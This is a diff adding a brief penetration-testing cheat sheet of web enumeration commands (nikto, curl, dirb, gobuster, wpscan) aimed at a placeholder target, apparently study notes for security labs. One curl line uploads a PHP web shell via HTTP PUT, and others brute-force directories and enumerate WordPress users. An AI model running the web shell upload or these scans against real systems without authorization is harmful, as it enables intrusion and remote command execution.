@@ -1,0 +1,52 @@
+Nikto
+
+nikto -h http://INSERTIPADDRESS
+	
+With proxy:
+nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
+Curl
+
+Get headers:
+curl -i INSERTIPADDRESS
+
+Get everything:
+curl -i -L INSERTIPADDRESS
+
+Check for title and all links:
+curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+
+Look at page with just text:
+curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq
+
+Check if it is possible to upload:
+curl -v -X OPTIONS http://INSERTIPADDRESS/
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
+Dirb
+
+dirb http://INSERTIPADDRESS
+
+Not recursive and with output file:
+dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
+
+Test with specified wordlist
+dirb http://INSERTIPADDRESS /usr/share/wordlists/dirb/common.txt
+
+Test for specific extensions
+dirb http://INSERTIPADDRESS -X .php,.txt
+
+Through proxy
+dirb http://INSERTIPADDRESS -p PROXYIP:PROXYPORT -P proxyusername:proxypassword
+
+If new subsites/directories are found rerun nikto/dirb as necessary
+Gobuster
+
+gobuster -u http://IPADDRESS/ -w words.txt
+
+Test for specific extensions
+gobuster -u http://IPADDRESS/ -w words.txt -x php,txt
+Wordpress scanner
+
+wpscan -u http://INSERTIPADDRESS
+
+Enumerate users:
+wpscan -u http://INSERTIPADDRESS -e u
